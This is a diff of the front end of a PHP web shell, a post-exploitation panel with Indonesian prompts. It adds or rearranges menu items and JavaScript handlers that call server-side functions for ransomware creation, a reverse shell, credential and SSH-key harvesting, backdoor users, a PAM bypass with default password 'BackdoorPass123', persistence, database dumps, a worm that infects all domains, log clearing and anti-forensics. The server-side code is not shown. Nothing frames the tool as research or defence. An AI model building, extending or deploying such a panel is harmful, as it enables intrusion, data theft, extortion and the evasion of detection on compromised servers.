+                        <div class="menu-title">🔧 Advanced</div>
                         <div class="menu-item" onclick="runCpanel()"><i class="fas fa-server"></i> cPanel</div>
-                        <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Sensitive</div>
-                        <div class="menu-item" onclick="runCreateRansom()"><i class="fas fa-skull"></i> Ransom</div>
-                        <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
-                        <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
+                        <div class="menu-item" onclick="runHarvest()"><i class="fas fa-key"></i> Harvest</div>
                         <div class="menu-item" onclick="runBackdoorUser()"><i class="fas fa-user-plus"></i> Backdoor User</div>
-                    </div>
-                    <div class="menu-section">
-                        <div class="menu-title">🛡️ Security</div>
-                        <div class="menu-item" onclick="runSelfDestruct()"><i class="fas fa-skull-crossbones"></i> Self-Destruct</div>
-                        <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti-Forensic</div>
+                        <div class="menu-item" onclick="runReverseShell()"><i class="fas fa-terminal"></i> Reverse Shell</div>
+                        <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
+                        <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
+                        <div class="menu-item" onclick="runCreateRansom()"><i class="fas fa-skull"></i> Ransomware</div>
+                        <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti Forensic</div>
                         <div class="menu-item" onclick="runBypassSuhosin()"><i class="fas fa-shield-alt"></i> Bypass Suhosin</div>
                         <div class="menu-item" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> FTP Account</div>
                         <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Mail Account</div>
@@ -3049,10 +2474,22 @@ if (isset($_SESSION['loggedin'])) {
                         <div class="menu-item" onclick="runPamBypass('remove')"><i class="fas fa-key"></i> Remove PAM Bypass</div>
                         <div class="menu-item" onclick="runUserPersistence('install')"><i class="fas fa-user"></i> User Persistence</div>
                         <div class="menu-item" onclick="runUserPersistence('remove')"><i class="fas fa-user"></i> Remove User Persistence</div>
-                        <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
-                        <div class="menu-item" onclick="runSystemCache()"><i class="fas fa-sync-alt"></i> Cache Repair</div>
+                        <div class="menu-item" onclick="runDump()"><i class="fas fa-database"></i> Dump DB</div>
+                        <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Sensitive Files</div>
                         <div class="menu-item" onclick="runClearLogs()"><i class="fas fa-eraser"></i> Clear Logs</div>
+                        <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
                     </div>
+                    
+                    <!-- UTILITY -->
+                    <div class="menu-section">
+                        <div class="menu-title">⚡ Utility</div>
+                        <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
+                        <div class="menu-item" onclick="runClean()"><i class="fas fa-eraser"></i> Clean Traces</div>
+                        <div class="menu-item" onclick="runCheckFile()"><i class="fas fa-info-circle"></i> Check File & Domain</div>
+                        <div class="menu-item" onclick="runCache()"><i class="fas fa-sync-alt"></i> Cache Repair</div>
+                    </div>
+                    
+                    <!-- EXIT -->
                     <div class="menu-section">
                         <div class="menu-title">🚪 Exit</div>
                         <a href="?logout" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
@@ -3136,12 +2573,12 @@ if (isset($_SESSION['loggedin'])) {
                                             <td><?= $permsFormatted ?></td>
                                             <td class="action-links">
                                                 <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)): ?>
-                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')"> Edit</a>
+                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">✏️ Edit</a>
                                                 <?php endif; ?>
-                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')"> Rename</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">DL</a>
+                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">✏️ Rename</a>
+                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">⬇️ DL</a>
                                                 <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
-                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">CHMOD</a>
+                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">🔒 CHMOD</a>
                                             </td>
                                         </tr>
                                     <?php } ?>
@@ -3208,7 +2645,7 @@ if (isset($_SESSION['loggedin'])) {
                             <label><input type="radio" name="delete_mode" value="shallow"> Shallow</label>
                             <label><input type="radio" name="delete_mode" value="deep"> Deep</label>
                         </div>
-                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">Delete</button>
+                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">🗑️ Delete</button>
                     </form>
                 </div>
             </div>
@@ -3216,7 +2653,7 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="renameModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title"> Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title">✏️ Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
@@ -3229,7 +2666,7 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="editModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title"> Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title">✏️ Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><textarea id="fileContent" name="content" class="form-control" style="min-height:200px;font-family:monospace;"></textarea></div>
@@ -3242,35 +2679,13 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="chmodModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title">🔒 CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required></div>
                         <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
                         <button type="submit" class="btn btn-block">✅ Change</button>
                     </form>
-                </div>
-            </div>
-        </div>
-
-        <div id="cpanelModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">🗄️ cPanel</h2><button class="modal-close" onclick="hideModal('cpanelModal')">&times;</button></div>
-                <div class="modal-body">
-                    <div class="form-group">
-                        <select id="cpanelAction" class="form-control" onchange="toggleCpanelFields()">
-                            <option value="list">List Accounts</option>
-                            <option value="create">Create Account</option>
-                            <option value="passwd">Change Password</option>
-                            <option value="backup">Backup Account</option>
-                            <option value="delete">Delete Account</option>
-                        </select>
-                    </div>
-                    <div id="cpanelFields" style="display:none;">
-                        <div class="form-group"><input type="text" id="cpanelUser" class="form-control" placeholder="Username"></div>
-                        <div class="form-group" id="cpanelExtraGroup"><input type="text" id="cpanelExtra" class="form-control" placeholder="Extra Parameters"></div>
-                    </div>
-                    <button onclick="runCpanelSubmit()" class="btn btn-block">🚀 Execute</button>
                 </div>
             </div>
         </div>
@@ -3286,46 +2701,16 @@ if (isset($_SESSION['loggedin'])) {
             function showRename(n){if(n){document.getElementById('newName').value=n;document.getElementById('renameTarget').value=n;showModal('renameModal');}}
             function showChmod(n,p){if(n){document.getElementById('permission').value=p;document.getElementById('chmodTarget').value=n;showModal('chmodModal');}}
 
-            function toggleCpanelFields(){
-                var action=document.getElementById('cpanelAction').value;
-                var fields=document.getElementById('cpanelFields');
-                if(action==='list'){fields.style.display='none';}else{fields.style.display='block';}
-                if(action==='delete'){document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="keep (opsional)">';}
-                else if(action==='create'){document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="domain password plan">';}
-                else{document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="param">';}
-            }
-
-            function runCpanelSubmit(){
-                var action=document.getElementById('cpanelAction').value;
-                var user=document.getElementById('cpanelUser').value||'';
-                var extra=document.getElementById('cpanelExtra').value||'';
-                if(action==='list'){fetch('?cpanel=1&action=list').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
-                else{fetch('?cpanel=1&action='+encodeURIComponent(action)+'&user='+encodeURIComponent(user)+'&extra='+encodeURIComponent(extra)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
-                hideModal('cpanelModal');
-            }
-
+            // ===== WORM =====
             function runWorm(){if(confirm('Yakin?')){fetch('?worm=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             function runWormInfectAll(){if(confirm('🪱 INFECT ALL DOMAINS?')){fetch('?worm_infect_all=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runDump(){if(confirm('Dump database?')){fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runHarvest(){if(confirm('Harvest?')){fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runCpanel(){showModal('cpanelModal');}
-            function runConfigFinder(){if(confirm('Cari file sensitif?')){fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runCreateRansom(){if(confirm('Buat ransomware?')){fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runWPScan(){if(confirm('Scan WP/Laravel?')){fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runSSHKeys(){if(confirm('Ambil SSH keys?')){fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runBackdoorUser(){var u=prompt('Username:');if(u){var p=prompt('Password:');fetch('?backdooruser=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runSystemCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runClearLogs(){if(confirm('Clear logs?')){fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runListSpread(){fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
-            function runSelfDestruct(){if(confirm('HAPUS SCRIPT INI?')){window.location.href='?selfdestruct=1&confirm=yes';}}
-            function runAntiForensic(){if(confirm('Anti-forensic?')){fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runBypassSuhosin(){if(confirm('Bypass Suhosin?')){fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runCreateFTP(){var u=prompt('Username:');if(u){var p=prompt('Password:');var h=prompt('Home:','/home/'+u);fetch('?create_ftp=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')+'&home='+encodeURIComponent(h)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runCreateMail(){var e=prompt('Email:');if(e){var p=prompt('Password:');fetch('?create_mail=1&email='+encodeURIComponent(e)+'&pass='+encodeURIComponent(p||'')+'&domain='+encodeURIComponent(e.split('@')[1]||window.location.hostname)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runDeepPersistence(action){var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?';if(confirm(msg)){fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runPamBypass(action){if(action==='install'){var pass=prompt('Backdoor password:')||'BackdoorPass123';if(confirm('Install PAM bypass?')){fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}else{if(confirm('Remove PAM bypass?')){fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}}
-            function runUserPersistence(action){var msg=action==='install'?'Install user persistence?':'Remove user persistence?';if(confirm(msg)){fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
             
+            // ===== UTILITY =====
+            function runClean(){if(confirm('Clean traces?')){fetch('?clean=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
+            function runCheckFile(){fetch('?check_file=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
+            function runCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
+            
+            // ===== ONE CLICK =====
             function runOneClick() {
                 if(confirm('⚠️ ONE CLICK ALL!\n\nIni akan menjalankan SEMUA fitur:\n- Spoof IP & UA\n- Clear logs & histories\n- Hide process\n- Fake login\n- Delete temp & sensitive files\n- Kill connections\n- Clear cache\n\nSETELAH ITU FILE AKAN DIHAPUS PERMANEN!\n\nYAKIN?')) {
                     if(confirm('KONFIRMASI AKHIR! File akan dihapus permanen!')) {
@@ -3333,6 +2718,88 @@ if (isset($_SESSION['loggedin'])) {
                     }
                 }
             }
+
+            // ===== ADVANCED =====
+            function runCpanel() {
+                var action = prompt('cPanel: list, create [user domain pass], delete [user]');
+                if(action) {
+                    var p = action.split(' ');
+                    fetch('?cpanel=1&action='+encodeURIComponent(p[0])+'&user='+encodeURIComponent(p[1]||'')+'&extra='+encodeURIComponent(p.slice(2).join(' ')))
+                        .then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));
+                }
+            }
+            
+            function runHarvest(){ if(confirm('Harvest credentials?')){ fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runBackdoorUser(){ 
+                var u=prompt('Username:'); 
+                if(u){ 
+                    var p=prompt('Password:'); 
+                    fetch('?backdooruser=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
+                } 
+            }
+            
+            function runReverseShell(){ 
+                var a=prompt('Reverse shell: start [ip] [port], stop [port], status'); 
+                if(a){ 
+                    var p=a.split(' '); 
+                    fetch('?reverseshell=1&action='+encodeURIComponent(p[0])+'&ip='+encodeURIComponent(p[1]||'')+'&port='+encodeURIComponent(p[2]||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
+                } 
+            }
+            
+            function runSSHKeys(){ if(confirm('Grab SSH keys?')){ fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runWPScan(){ if(confirm('Scan WordPress/Laravel?')){ fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runCreateRansom(){ if(confirm('Create ransomware?')){ fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runAntiForensic(){ if(confirm('Anti forensic?')){ fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runBypassSuhosin(){ if(confirm('Bypass Suhosin?')){ fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runCreateFTP(){ 
+                var u=prompt('Username:'); 
+                if(u){ 
+                    var p=prompt('Password:'); 
+                    var h=prompt('Home:','/home/'+u); 
+                    fetch('?create_ftp=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')+'&home='+encodeURIComponent(h)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
+                } 
+            }
+            
+            function runCreateMail(){ 
+                var e=prompt('Email:'); 
+                if(e){ 
+                    var p=prompt('Password:'); 
+                    fetch('?create_mail=1&email='+encodeURIComponent(e)+'&pass='+encodeURIComponent(p||'')+'&domain='+encodeURIComponent(e.split('@')[1]||window.location.hostname)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
+                } 
+            }
+            
+            function runDeepPersistence(action){ 
+                var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?'; 
+                if(confirm(msg)){ fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
+            }
+            
+            function runPamBypass(action){ 
+                if(action==='install'){ 
+                    var pass=prompt('Backdoor password:')||'BackdoorPass123'; 
+                    if(confirm('Install PAM bypass?')){ fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
+                } else { 
+                    if(confirm('Remove PAM bypass?')){ fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
+                } 
+            }
+            
+            function runUserPersistence(action){ 
+                var msg=action==='install'?'Install user persistence?':'Remove user persistence?'; 
+                if(confirm(msg)){ fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
+            }
+            
+            function runDump(){ if(confirm('Dump database?')){ fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runConfigFinder(){ if(confirm('Find sensitive files?')){ fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runClearLogs(){ if(confirm('Clear logs?')){ fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            
+            function runListSpread(){ fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); }
 
             window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
             <?php if(isset($_GET['edit'])): ?><?php $file=$_GET['edit']; $filePath=$currentPath.DIRECTORY_SEPARATOR.$file; $content=(file_exists($filePath)&&is_file($filePath)&&isSafePath($filePath,$rootPath,$specialDirectories)&&in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),$editableExtensions))?@file_get_contents($filePath):''; ?>document.addEventListener('DOMContentLoaded',function(){document.getElementById('fileContent').value=<?= json_encode($content) ?>;document.getElementById('editFileName').value=<?= json_encode($file) ?>;showModal('editModal');});<?php endif; ?>
